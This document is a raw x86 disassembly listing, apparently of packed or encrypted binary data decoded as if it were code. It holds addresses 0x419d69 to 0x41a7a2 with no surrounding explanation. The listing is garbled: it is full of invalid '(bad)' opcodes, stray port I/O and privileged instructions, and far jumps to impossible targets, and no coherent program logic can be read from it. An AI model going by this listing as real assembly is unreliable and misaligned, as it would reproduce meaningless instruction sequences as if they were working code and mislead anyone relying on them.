  419d69:	ret    0x15c1
  419d6c:	mov    DWORD PTR [edi],ebp
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fisubr DWORD PTR ss:[eax+0x672b9fcf]
  419de7:	push   ss
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	mov    ds:0xe9983cb9,al
  419df3:	loope  0x419d7c
  419df5:	(bad)  
  419df6:	repz jne 0x419d8a
  419df9:	and    BYTE PTR [edi-0x354b2f62],0x79
  419e00:	in     al,0x51
  419e02:	stos   BYTE PTR es:[edi],al
  419e03:	ror    DWORD PTR [edx-0x62eed9c4],0x72
  419e0a:	retf   0x46d6
  419e0d:	dec    ebp
  419e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e0f:	dec    ecx
  419e10:	jnp    0x419dab
  419e12:	cmp    BYTE PTR [ecx],bl
  419e14:	shl    BYTE PTR [edx],0x7d
  419e17:	jae    0x419e0b
  419e19:	jmp    0x7085:0x9a667631
  419e20:	fld    TBYTE PTR [ecx+0xdcf3169]
  419e26:	jo     0x419db6
  419e28:	adc    eax,0xb4f3ffca
  419e2d:	mov    ecx,0x509b847b
  419e32:	pop    ss
  419e33:	cdq    
  419e34:	jae    0x419e14
  419e36:	shr    ch,cl
  419e38:	push   es
  419e39:	ss js  0x419deb
  419e3c:	shr    DWORD PTR [edi-0x2a],cl
  419e3f:	ins    DWORD PTR es:[edi],dx
  419e40:	into   
  419e41:	jns    0x419e5b
  419e43:	jecxz  0x419e21
  419e45:	test   al,0x83
  419e47:	pop    ebx
  419e48:	mov    ecx,0xbd9d5732
  419e4d:	and    DWORD PTR [edi],eax
  419e4f:	iret   
  419e50:	retf   
  419e51:	jmp    0x419df2
  419e53:	adc    ebp,DWORD PTR [esi-0x2e]
  419e56:	xchg   edi,eax
  419e57:	in     al,0xb3
  419e59:	and    BYTE PTR [edi-0x194958cf],cl
  419e5f:	cmp    DWORD PTR [esi+0x3f],esi
  419e62:	sub    BYTE PTR fs:[ecx+0x794748c6],ah
  419e69:	aaa    
  419e6a:	xor    edx,DWORD PTR [edx+0x3930a13]
  419e70:	adc    esp,DWORD PTR [esi+eax*2-0x7]
  419e74:	nop
  419e75:	sti    
  419e76:	mov    DWORD PTR [ebp+0x51],esi
  419e79:	xchg   esi,eax
  419e7a:	pop    esi
  419e7b:	pop    eax
  419e7c:	(bad)  
  419e7d:	in     eax,0x3d
  419e7f:	xchg   ebp,eax
  419e80:	lea    esp,ds:0x623169f0
  419e86:	and    ch,bl
  419e88:	xchg   DWORD PTR [esi+0x78],esi
  419e8b:	adc    BYTE PTR [ecx],dh
  419e8d:	or     al,0x71
  419e8f:	out    dx,al
  419e90:	dec    esp
  419e91:	in     al,dx
  419e92:	inc    edx
  419e93:	dec    ecx
  419e94:	in     eax,0xe7
  419e96:	bound  ebp,QWORD PTR [ebp-0x61]
  419e99:	and    ah,BYTE PTR [ebp-0x5fe815d9]
  419e9f:	stos   BYTE PTR es:[edi],al
  419ea0:	inc    edi
  419ea1:	xor    bh,BYTE PTR [edi]
  419ea3:	hlt    
  419ea4:	loopne 0x419ee4
  419ea6:	adc    al,0x7f
  419ea8:	pop    esp
  419ea9:	out    0x9a,al
  419eab:	xchg   ecx,eax
  419eac:	mov    edi,DWORD PTR [eax+edx*4]
  419eaf:	fst    DWORD PTR ds:0x2235f9f3
  419eb5:	out    dx,eax
  419eb6:	or     BYTE PTR [edx-0x398846ba],0xf
  419ebd:	imul   esi,DWORD PTR ds:0xbd57eca0,0x75
  419ec4:	jmp    0x419f0b
  419ec6:	sbb    DWORD PTR [edi+eiz*4],esp
  419ec9:	sub    eax,0xbdeffb4e
  419ecf:	mov    cl,0x18
  419ed1:	(bad)  
  419ed2:	ins    DWORD PTR es:[edi],dx
  419ed3:	ds aam 0xfa
  419ed6:	ja     0x419e7c
  419ed8:	fadd   DWORD PTR [edx+0x5f181c61]
  419ede:	and    DWORD PTR [ebx-0x46150151],edi
  419ee4:	fnstsw WORD PTR [esi]
  419ee6:	lahf   
  419ee7:	mov    fs,WORD PTR [edx]
  419ee9:	push   ebp
  419eea:	fld    TBYTE PTR [ebx]
  419eec:	sub    bl,BYTE PTR [edi+0x0]
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	mov    esp,0x67140866
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	pusha  
  419f6f:	jg     0x419f3d
  419f71:	iret   
  419f72:	cmp    BYTE PTR [ebp+0x13],bl
  419f75:	loop   0x419f37
  419f77:	fidiv  WORD PTR [edi]
  419f79:	mov    gs,WORD PTR [esi]
  419f7b:	and    al,0xcd
  419f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f7e:	arpl   WORD PTR ds:[esi],dx
  419f81:	xchg   esp,eax
  419f82:	push   esi
  419f83:	(bad)  
  419f84:	ss (bad) 
  419f86:	xor    eax,0xbd085144
  419f8b:	test   al,0x47
  419f8d:	ja     0x419f19
  419f8f:	jecxz  0x419fbd
  419f91:	sbb    ch,ch
  419f93:	inc    edx
  419f94:	push   ebp
  419f95:	aas    
  419f96:	imul   ebp,DWORD PTR [ecx],0x12c86f9a
  419f9c:	xor    dh,BYTE PTR [esi-0x7d969819]
  419fa2:	fadd   DWORD PTR [ebx+edi*8-0x40]
  419fa6:	rcr    BYTE PTR [esi-0x2b],cl
  419fa9:	ret    
  419faa:	and    al,0xa2
  419fac:	or     eax,eax
  419fae:	push   ds
  419faf:	xor    cl,BYTE PTR [ebx+0x22de0890]
  419fb5:	inc    ebx
  419fb6:	outs   dx,DWORD PTR ds:[esi]
  419fb7:	loopne 0x419f92
  419fb9:	retf   0x1c32
  419fbc:	or     DWORD PTR [ebp+0x5],0x22e1edc8
  419fc3:	loopne 0x419ff5
  419fc5:	jl     0x41a041
  419fc7:	fadd   QWORD PTR [edi-0x77]
  419fca:	test   DWORD PTR [eax],0x9ec97e87
  419fd0:	sahf   
  419fd1:	mov    ds:0xd8118366,eax
  419fd6:	pop    edx
  419fd7:	push   ds
  419fd8:	cmp    bl,dh
  419fda:	daa    
  419fdb:	and    ecx,DWORD PTR [esi-0x44c57153]
  419fe1:	call   0xa6c9d656
  419fe6:	retf   0xbce8
  419fe9:	pop    ebx
  419fea:	sub    eax,DWORD PTR ds:0xe578ff6d
  419ff0:	lods   eax,DWORD PTR ds:[esi]
  419ff1:	push   ebp
  419ff2:	shl    BYTE PTR [esi-0x45],cl
  419ff5:	ins    DWORD PTR es:[edi],dx
  419ff6:	jmp    0xd974c345
  419ffb:	(bad)  
  419ffc:	or     BYTE PTR [ecx+0x11],dl
  419fff:	push   ebx
  41a000:	push   DWORD PTR [eax+0x1b8e2178]
  41a006:	aaa    
  41a007:	inc    ecx
  41a008:	lods   al,BYTE PTR ds:[esi]
  41a009:	jnp    0x41a021
  41a00b:	and    eax,0x6d5a765a
  41a010:	lds    esp,FWORD PTR [edi-0x491f12a1]
  41a016:	mov    ebp,0xbb18fefd
  41a01b:	pop    ds
  41a01c:	in     eax,0xf9
  41a01e:	jne    0x419fbe
  41a020:	inc    eax
  41a021:	dec    ecx
  41a022:	and    al,0x2c
  41a024:	pop    esi
  41a025:	mov    ebx,es
  41a027:	cwde   
  41a028:	(bad)  
  41a02a:	retf   
  41a02b:	nop
  41a02c:	clc    
  41a02d:	mov    ch,0xce
  41a02f:	adc    cl,BYTE PTR [eax+0x35463a03]
  41a035:	or     eax,0x2e1fe40b
  41a03a:	sbb    BYTE PTR [ebx-0x16],ch
  41a03d:	cdq    
  41a03e:	ret    0xb024
  41a041:	mov    dh,BYTE PTR [ecx+0x56abce7]
  41a047:	leave  
  41a048:	imul   ebp,ecx,0x7d
  41a04b:	add    eax,0x3bbd3fb4
  41a050:	xor    bl,BYTE PTR [eax-0x2c]
  41a053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a054:	jle    0x41a05a
  41a056:	imul   esi,DWORD PTR [edi-0x6e],0x9898e1c9
  41a05d:	xchg   BYTE PTR [ebx],ch
  41a05f:	xor    BYTE PTR [edi+0x5e8f38f7],0x98
  41a066:	(bad)  
  41a067:	mov    al,ds:0xd051a4be
  41a06c:	shl    BYTE PTR [edx+0x0],0x0
	...
  41a0d4:	add    BYTE PTR [eax],al
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x7b],bh
  41a0e3:	push   DWORD PTR [ebx+0x118673e]
  41a0e9:	add    BYTE PTR [eax],al
  41a0eb:	add    DWORD PTR [eax],eax
  41a0ed:	add    BYTE PTR [esi-0x2d],ah
  41a0f0:	jo     0x41a080
  41a0f2:	sub    esi,ebx
  41a0f4:	and    al,0x63
  41a0f6:	mov    cl,0xd2
  41a0f8:	mov    ecx,0x3d84139b
  41a0fd:	cmp    edi,DWORD PTR [eax+ebp*8-0x3273e16b]
  41a104:	lock push esi
  41a106:	cmp    edx,DWORD PTR [edi+0x55bf7f5f]
  41a10c:	dec    edi
  41a10d:	imul   edx,DWORD PTR [eax-0x1e],0x9184d906
  41a114:	pushf  
  41a115:	mov    ds:0xede4e432,eax
  41a11a:	pop    ebx
  41a11b:	data16 sbb BYTE PTR [ebx],bh
  41a11e:	cmp    eax,0x86a26568
  41a123:	lods   eax,DWORD PTR ds:[esi]
  41a124:	jno    0x41a12f
  41a126:	fwait
  41a127:	mov    eax,0x96c33a60
  41a12c:	mov    fs,WORD PTR [edi+0x544f227a]
  41a132:	arpl   WORD PTR [ebp-0x7fa4a60d],dx
  41a138:	es xor al,0x2
  41a13b:	call   0xfd0e:0xe4b25d73
  41a142:	or     DWORD PTR [ebp-0x2bb69edc],ebp
  41a148:	outs   dx,DWORD PTR ds:[esi]
  41a149:	dec    edx
  41a14a:	scas   eax,DWORD PTR es:[edi]
  41a14b:	jp     0x41a101
  41a14d:	xchg   esi,eax
  41a14e:	out    0xb6,eax
  41a150:	lds    esi,FWORD PTR [eax-0x32e2b384]
  41a156:	pop    ebx
  41a157:	xchg   esi,eax
  41a158:	and    eax,0xec67208a
  41a15d:	pop    eax
  41a15e:	add    al,0x21
  41a160:	enter  0xc754,0x38
  41a164:	jmp    0x41a192
  41a166:	mov    dh,0xb
  41a168:	test   BYTE PTR [esi-0x26d9d26d],cl
  41a16e:	scas   al,BYTE PTR es:[edi]
  41a16f:	jo     0x41a144
  41a171:	outs   dx,DWORD PTR ds:[esi]
  41a172:	inc    eax
  41a173:	add    bh,BYTE PTR [eax-0x15e033de]
  41a179:	or     bl,al
  41a17b:	pop    ebp
  41a17c:	push   0x9cce0eec
  41a181:	mov    edx,0x471cb74c
  41a186:	ret    0x1c5c
  41a189:	fwait
  41a18a:	sub    dl,bl
  41a18c:	in     eax,dx
  41a18d:	gs fwait
  41a18f:	push   ss
  41a190:	or     al,BYTE PTR [edx+0x17]
  41a193:	adc    al,0x63
  41a195:	cdq    
  41a196:	dec    ebx
  41a197:	ficom  WORD PTR [esi]
  41a199:	lods   eax,DWORD PTR ds:[esi]
  41a19a:	fidiv  DWORD PTR [eax]
  41a19c:	iret   
  41a19d:	(bad)  
  41a19e:	jmp    0xcf856ad9
  41a1a3:	fidiv  WORD PTR [edx-0x19cb3b79]
  41a1a9:	fidiv  WORD PTR [esi-0x4f]
  41a1ac:	push   0xffffffe3
  41a1ae:	faddp  st(2),st
  41a1b0:	(bad)  
  41a1b1:	es rol bl,1
  41a1b4:	(bad)  
  41a1b5:	popf   
  41a1b6:	mov    ah,0x9d
  41a1b8:	jne    0x41a1c5
  41a1ba:	pop    ss
  41a1bb:	imul   edx,edx,0x317ec74c
  41a1c1:	jmp    0x799947a9
  41a1c6:	cmp    eax,0x39ad50b5
  41a1cb:	jge    0x41a233
  41a1cd:	(bad)  
  41a1cf:	jmp    0x41a17f
  41a1d1:	ret    
  41a1d2:	inc    esp
  41a1d3:	mov    al,ds:0xd84e269
  41a1d8:	fld    TBYTE PTR [edi+0x4f]
  41a1db:	mov    ebx,0x5b5bf77e
  41a1e0:	or     eax,esi
  41a1e2:	push   ecx
  41a1e3:	xchg   esi,eax
  41a1e4:	push   ebp
  41a1e5:	pop    edi
  41a1e6:	lods   al,BYTE PTR ds:[esi]
  41a1e7:	pusha  
  41a1e8:	jbe    0x41a267
  41a1ea:	adc    eax,0x74d63c
	...
  41a253:	add    BYTE PTR [eax],al
  41a255:	add    BYTE PTR [esp+ecx*1],bl
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	js     0x41a269
  41a264:	dec    ebp
  41a265:	stc    
  41a266:	sbb    DWORD PTR [bx+di],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [edx],ch
  41a26f:	inc    edi
  41a270:	test   BYTE PTR [ecx+eiz*8+0x13],0xa1
  41a275:	stos   BYTE PTR es:[edi],al
  41a276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a277:	xchg   edx,eax
  41a278:	push   eax
  41a279:	mov    ?,WORD PTR [edi+0x7c]
  41a27c:	add    eax,0xf05dfbc6
  41a281:	mov    bh,0x23
  41a283:	push   edi
  41a284:	retf   
  41a285:	lods   al,BYTE PTR ds:[esi]
  41a286:	lods   al,BYTE PTR ds:[esi]
  41a287:	mov    esp,ebp
  41a289:	aad    0x4d
  41a28b:	jo     0x41a2a6
  41a28d:	popf   
  41a28e:	test   BYTE PTR [ecx-0x4347273c],al
  41a294:	sbb    dh,cl
  41a296:	mov    ds:0x4d6df04d,al
  41a29b:	lods   eax,DWORD PTR ds:[esi]
  41a29c:	jbe    0x41a2b6
  41a29e:	adc    eax,0xec9c8b3c
  41a2a3:	sbb    al,0xa9
  41a2a5:	inc    ebx
  41a2a6:	mov    eax,0xf58b345c
  41a2ab:	fsub   DWORD PTR [esi-0x53e11398]
  41a2b1:	sub    al,BYTE PTR [eax+0x69]
  41a2b4:	je     0x41a2c9
  41a2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b7:	xor    al,0xbc
  41a2b9:	(bad)  
  41a2ba:	fbld   TBYTE PTR [edi]
  41a2bc:	xchg   esi,eax
  41a2bd:	sbb    ch,BYTE PTR [esi+0x333606ca]
  41a2c3:	outs   dx,DWORD PTR ds:[esi]
  41a2c4:	sub    BYTE PTR [esi],dh
  41a2c6:	push   cs
  41a2c7:	ds xchg edx,eax
  41a2c9:	adc    eax,0xf034785
  41a2ce:	add    al,0x39
  41a2d0:	pop    ebp
  41a2d1:	push   ebx
  41a2d2:	mov    ecx,0xc7653d24
  41a2d7:	cdq    
  41a2d8:	sub    DWORD PTR [ebx+0x29],edi
  41a2db:	mov    al,0x9a
  41a2dd:	repnz xor DWORD PTR [eax+0x53],edi
  41a2e1:	pop    ebp
  41a2e2:	mov    esp,0x56e760cd
  41a2e7:	add    DWORD PTR [ecx+0x18],0x7ab0b500
  41a2ee:	test   ebp,ebp
  41a2f0:	mov    ecx,edi
  41a2f2:	jmp    0x63a7:0x1e815638
  41a2f9:	jno    0x41a359
  41a2fb:	je     0x41a29a
  41a2fd:	jo     0x41a2ff
  41a2ff:	add    eax,0x74e32725
  41a304:	leave  
  41a305:	mov    ebp,0xa8b7c7ba
  41a30a:	xchg   ebp,eax
  41a30b:	add    al,0x92
  41a30d:	jne    0x41a2fe
  41a30f:	add    BYTE PTR [ebx-0x6d515210],dh
  41a315:	mov    al,0xf5
  41a317:	adc    DWORD PTR [ebx-0x29],0x6d
  41a31b:	shr    DWORD PTR [eax+0x51d07e85],1
  41a321:	cmp    al,0x37
  41a323:	stos   BYTE PTR es:[edi],al
  41a324:	cld    
  41a325:	ror    DWORD PTR [eax],0x49
  41a328:	test   DWORD PTR [ebx-0x2352e3dc],ecx
  41a32e:	adc    DWORD PTR [ecx-0x5a7992a9],ebp
  41a334:	xchg   ecx,eax
  41a335:	push   edx
  41a336:	cmp    ebx,esp
  41a338:	pop    ebx
  41a339:	dec    edi
  41a33a:	ins    DWORD PTR es:[edi],dx
  41a33b:	repnz repz lds edi,FWORD PTR cs:[eax]
  41a340:	mov    dl,0xd0
  41a342:	cli    
  41a343:	test   eax,0x3dc257cb
  41a348:	or     ebx,DWORD PTR [ecx-0x7767cde6]
  41a34e:	sub    DWORD PTR [edx],ebx
  41a350:	int3   
  41a351:	mov    bl,0xf6
  41a353:	sub    DWORD PTR [edi+0x6a],ebx
  41a356:	retf   
  41a357:	lds    ebx,FWORD PTR [ecx+0x8]
  41a35a:	lock push ecx
  41a35c:	hlt    
  41a35d:	loope  0x41a325
  41a35f:	sbb    dh,0xf3
  41a362:	cwde   
  41a363:	aam    0x27
  41a365:	ficom  WORD PTR [edi+0x22]
  41a368:	(bad)  
  41a369:	cmp    esp,ecx
  41a36b:	sbb    al,BYTE PTR [edi+0xa7]
	...
  41a3d5:	add    bh,dh
  41a3d7:	pop    eax
  41a3d8:	test   al,0x13
  41a3da:	scas   eax,DWORD PTR es:[edi]
  41a3db:	repz (bad) 
  41a3dd:	cld    
  41a3de:	adc    eax,0x7da6955c
  41a3e3:	and    eax,0x1a671185
  41a3e8:	add    DWORD PTR [eax],eax
  41a3ea:	add    BYTE PTR [ecx],al
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	loope  0x41a439
  41a3f0:	shl    esp,0x56
  41a3f3:	stos   BYTE PTR es:[edi],al
  41a3f4:	sub    ah,BYTE PTR [esi]
  41a3f6:	mov    eax,ds:0x4659f51a
  41a3fb:	out    0x9b,al
  41a3fd:	xchg   esp,eax
  41a3fe:	outs   dx,DWORD PTR ds:[esi]
  41a3ff:	inc    ebp
  41a400:	mov    edi,0x70999a70
  41a405:	inc    ecx
  41a406:	out    dx,al
  41a407:	sub    edx,ecx
  41a409:	pop    esp
  41a40a:	inc    eax
  41a40b:	cmp    DWORD PTR [esi],0xb4e7ca6d
  41a411:	in     eax,dx
  41a412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a413:	push   ds
  41a414:	push   0x42
  41a416:	sar    BYTE PTR [edx+0x7c1e44ec],1
  41a41c:	aam    0xeb
  41a41e:	push   cs
  41a41f:	cdq    
  41a420:	mov    ebx,0xfa95f2ad
  41a425:	push   ecx
  41a426:	push   DWORD PTR [esi-0x4a]
  41a429:	mov    ebp,0xd422954e
  41a42e:	or     ebx,DWORD PTR [edx+0x17]
  41a431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a432:	mov    ah,0x60
  41a434:	mov    ?,WORD PTR [ebp-0x4bce5412]
  41a43a:	int    0xd3
  41a43c:	in     al,dx
  41a43d:	and    ah,BYTE PTR [ebx-0x37]
  41a440:	mov    ebx,0x902f9f1e
  41a445:	in     eax,0xfd
  41a447:	sahf   
  41a448:	cmp    al,BYTE PTR [eax-0x25]
  41a44b:	sub    DWORD PTR [edx+0x3c],ebp
  41a44e:	dec    edx
  41a44f:	int3   
  41a450:	rol    DWORD PTR [ebx+0x30],cl
  41a453:	jne    0x41a4b5
  41a455:	xor    eax,0x828832af
  41a45a:	push   ebx
  41a45b:	ja     0x41a45f
  41a45d:	pop    edi
  41a45e:	popf   
  41a45f:	in     al,0x5a
  41a461:	xchg   esp,eax
  41a462:	mov    esi,0x6d758607
  41a467:	iret   
  41a468:	stos   BYTE PTR es:[edi],al
  41a469:	mov    BYTE PTR [eax-0x58ec4eb5],ah
  41a46f:	cmp    al,BYTE PTR [eax+0x2]
  41a472:	pop    edx
  41a473:	fistp  WORD PTR [edi]
  41a475:	fs inc ecx
  41a477:	in     al,0x4d
  41a479:	dec    edi
  41a47a:	mov    eax,ds:0xf0364cf1
  41a47f:	jns    0x41a487
  41a481:	mov    ah,0xae
  41a483:	in     eax,dx
  41a484:	jge    0x41a452
  41a486:	outs   dx,DWORD PTR ds:[esi]
  41a487:	push   ss
  41a488:	jmp    0x83b6283b
  41a48d:	inc    ebp
  41a48e:	mov    cl,0x38
  41a490:	jno    0x41a49a
  41a492:	mov    esp,0xb81e8f9b
  41a497:	mov    WORD PTR [ebx+edi*1-0x3f],es
  41a49b:	out    dx,eax
  41a49c:	add    ecx,DWORD PTR [edi-0x46261980]
  41a4a2:	mov    dl,0xb
  41a4a4:	xchg   ebx,eax
  41a4a5:	jmp    0x3b9d:0xc5875e22
  41a4ac:	cwde   
  41a4ad:	loop   0x41a4aa
  41a4af:	ror    DWORD PTR [ecx],cl
  41a4b1:	push   esi
  41a4b2:	inc    esi
  41a4b3:	adc    eax,0x4250c9e4
  41a4b8:	sbb    eax,0xffd10465
  41a4bd:	sbb    DWORD PTR [ecx],ebx
  41a4bf:	lods   eax,DWORD PTR ds:[esi]
  41a4c0:	rol    DWORD PTR [ebx+0x60f9879e],0xaf
  41a4c7:	out    dx,al
  41a4c8:	lods   eax,DWORD PTR ds:[esi]
  41a4c9:	push   ebp
  41a4ca:	push   cs
  41a4cb:	outs   dx,BYTE PTR ds:[esi]
  41a4cc:	dec    edi
  41a4cd:	into   
  41a4ce:	repnz sbb BYTE PTR [esi],cl
  41a4d1:	int    0xef
  41a4d3:	xchg   BYTE PTR [ecx],al
  41a4d5:	adc    eax,0x6ef70361
  41a4da:	pop    es
  41a4db:	fidiv  DWORD PTR [eax]
  41a4dd:	mov    es,edi
  41a4df:	ret    0xe8d8
  41a4e2:	stos   DWORD PTR es:[edi],eax
  41a4e3:	fidivr DWORD PTR ds:0x4ececc42
  41a4e9:	adc    ebx,DWORD PTR [edx+0x4e]
  41a4ec:	xchg   BYTE PTR [ecx+0x0],dl
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	fisttp QWORD PTR [eax+0x1b6756c9]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	add    BYTE PTR [ecx],al
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	dec    BYTE PTR [ebx-0x6d]
  41a571:	push   edi
  41a572:	pushf  
  41a573:	sbb    eax,0x4656d0e5
  41a578:	into   
  41a579:	ds ret 0x5ae9
  41a57d:	add    DWORD PTR [esi],0x5383cdee
  41a583:	cdq    
  41a584:	cmp    eax,0xb7f44936
  41a589:	leave  
  41a58a:	or     BYTE PTR [ebx-0x36],bh
  41a58d:	mov    edx,DWORD PTR [edx+edi*8+0x38301aad]
  41a594:	xchg   ebx,eax
  41a595:	push   ebp
  41a596:	hlt    
  41a597:	test   BYTE PTR [edi-0x2c0258d],0x8f
  41a59e:	ror    dh,0xaa
  41a5a1:	and    al,0xb6
  41a5a3:	jae    0x41a537
  41a5a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5a6:	rcl    dh,0xe8
  41a5a9:	mov    BYTE PTR [esi],ch
  41a5ab:	pop    ebp
  41a5ac:	rcl    BYTE PTR [eax+esi*4+0x2b5aa66],0x2a
  41a5b4:	adc    eax,0x3464ca59
  41a5b9:	leave  
  41a5ba:	(bad)  
  41a5bd:	cmp    DWORD PTR [edx],ebp
  41a5bf:	loopne 0x41a5cf
  41a5c1:	pop    ecx
  41a5c2:	jle    0x41a606
  41a5c4:	add    eax,0xdc25271b
  41a5c9:	and    ebp,edx
  41a5cb:	ficomp DWORD PTR [esp+ebx*2]
  41a5ce:	pop    ds
  41a5cf:	mov    eax,0x976be34d
  41a5d4:	inc    esp
  41a5d5:	mov    al,ds:0xbbe34bb2
  41a5da:	inc    ebx
  41a5db:	pop    ds
  41a5dc:	mov    al,0x3f
  41a5de:	out    0xec,al
  41a5e0:	pushw  0x74
  41a5e3:	stos   DWORD PTR es:[edi],eax
  41a5e4:	(bad)  
  41a5e6:	call   0x2eb78771
  41a5eb:	enter  0x22e6,0x3e
  41a5ef:	ja     0x41a593
  41a5f1:	fcmove st,st(4)
  41a5f3:	cs inc ecx
  41a5f5:	shr    BYTE PTR [ebp-0x18],0xf2
  41a5f9:	sbb    bh,dl
  41a5fb:	jb     0x41a5b3
  41a5fd:	rcr    DWORD PTR [esi-0x57],cl
  41a600:	(bad)  
  41a601:	mov    al,ds:0x2c520015
  41a606:	idiv   edi
  41a608:	aaa    
  41a609:	imul   esp,DWORD PTR [ebx+0x7e],0xffffff8b
  41a60d:	outs   dx,BYTE PTR ds:[esi]
  41a60e:	rcl    DWORD PTR [ecx],1
  41a610:	cs repnz mov esi,0xdd0062df
  41a617:	call   0x6fcd:0xb89e4748
  41a61e:	pusha  
  41a61f:	test   al,0xf1
  41a621:	scas   eax,DWORD PTR es:[edi]
  41a622:	aas    
  41a623:	jle    0x41a5bb
  41a625:	add    eax,0x246506fd
  41a62a:	mov    DWORD PTR [esi-0x1b],ebp
  41a62d:	fmul   DWORD PTR [ebx]
  41a62f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a630:	jecxz  0x41a629
  41a632:	stc    
  41a633:	cmp    edi,0x3
  41a636:	cs xchg ebp,eax
  41a638:	push   esp
  41a639:	mov    al,ds:0xe5c86c61
  41a63e:	mov    al,0x52
  41a640:	outs   dx,BYTE PTR ds:[esi]
  41a641:	pushf  
  41a642:	mov    ds:0x458a177f,al
  41a647:	repz data16 sub ch,bl
  41a64b:	pop    ebx
  41a64c:	inc    esi
  41a64d:	clc    
  41a64e:	imul   esp,DWORD PTR [edi+0xc],0xffffffcf
  41a652:	cmp    DWORD PTR [esi],0x1d1d7f43
  41a658:	aas    
  41a659:	(bad)  
  41a65a:	int3   
  41a65b:	push   edx
  41a65c:	sub    ah,BYTE PTR [esi]
  41a65e:	loop   0x41a629
  41a660:	inc    esi
  41a661:	dec    esp
  41a662:	aam    0x2c
  41a664:	gs pop ds
  41a666:	xchg   BYTE PTR [eax+ebp*8-0x2d1a2652],ch
  41a66d:	das    
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xa46a625
  41a6e4:	retf   0x6719
  41a6e7:	sbb    al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [edi],al
  41a6ef:	lds    eax,FWORD PTR [ebx+0x34b03782]
  41a6f5:	repz shl bh,0x15
  41a6f9:	mov    edi,0x2f1412cd
  41a6fe:	mov    al,0x33
  41a700:	dec    ecx
  41a701:	mov    ecx,0xf955a8da
  41a706:	fwait
  41a707:	arpl   WORD PTR [esi+0x33fa8613],bp
  41a70d:	and    dl,ah
  41a70f:	pop    ss
  41a710:	ret    0x9dbc
  41a713:	aas    
  41a714:	mov    al,ds:0x5fa61686
  41a719:	ret    0xfcd1
  41a71c:	cld    
  41a71d:	push   0x69a243fc
  41a722:	dec    esi
  41a723:	and    eax,0x6b9ddb13
  41a728:	jns    0x41a73e
  41a72a:	mov    ds,WORD PTR [esi+0x695b4beb]
  41a730:	inc    edi
  41a731:	push   esi
  41a732:	pop    ss
  41a733:	push   ebx
  41a734:	add    ah,BYTE PTR [edx+0x42]
  41a737:	and    al,0xec
  41a739:	mov    ds:0xcf296514,al
  41a73e:	lods   al,BYTE PTR ds:[esi]
  41a73f:	popf   
  41a740:	imul   ecx,esp,0xffffffc5
  41a743:	aas    
  41a744:	mov    ebx,0xc54269a6
  41a749:	dec    edx
  41a74a:	sbb    bl,BYTE PTR [ebp+0x7c]
  41a74d:	mov    DWORD PTR [edi],eax
  41a74f:	dec    esp
  41a750:	xchg   ecx,eax
  41a751:	inc    ecx
  41a752:	lock sub BYTE PTR [eax+0x4b],ah
  41a756:	push   cs
  41a757:	lods   al,BYTE PTR ds:[esi]
  41a758:	(bad)  
  41a759:	lock fadd st,st(4)
  41a75c:	aad    0x32
  41a75e:	mov    eax,0xfe8c3f5c
  41a763:	hlt    
  41a764:	stc    
  41a765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a766:	cmp    esp,DWORD PTR [ebx+0x3]
  41a769:	fmul   DWORD PTR [eax-0x51]
  41a76c:	nop
  41a76d:	cmc    
  41a76e:	sub    DWORD PTR [eax],ebp
  41a770:	sub    al,0xf1
  41a772:	retf   0x7b02
  41a775:	jle    0x41a754
  41a777:	fs int 0x79
  41a77a:	int3   
  41a77b:	fwait
  41a77c:	je     0x41a7fa
  41a77e:	arpl   WORD PTR [ebx-0x68],bp
  41a781:	rol    BYTE PTR [ecx-0x35],0x26
  41a785:	pop    ebx
  41a786:	inc    esi
  41a787:	test   al,0x5e
  41a789:	les    ecx,FWORD PTR [ecx+0x1868eafb]
  41a78f:	outs   dx,DWORD PTR ds:[esi]
  41a790:	jmp    0x97c05fc
  41a795:	or     BYTE PTR ds:0x61e,bh
  41a79a:	mov    DWORD PTR [esi],ebx
  41a79c:	adc    bl,al
  41a79e:	pop    ecx
  41a79f:	push   cs
  41a7a0:	es push ecx
  41a7a2:	sbb    esi,DWORD PTR [edx*4-0x5bad6ec6]
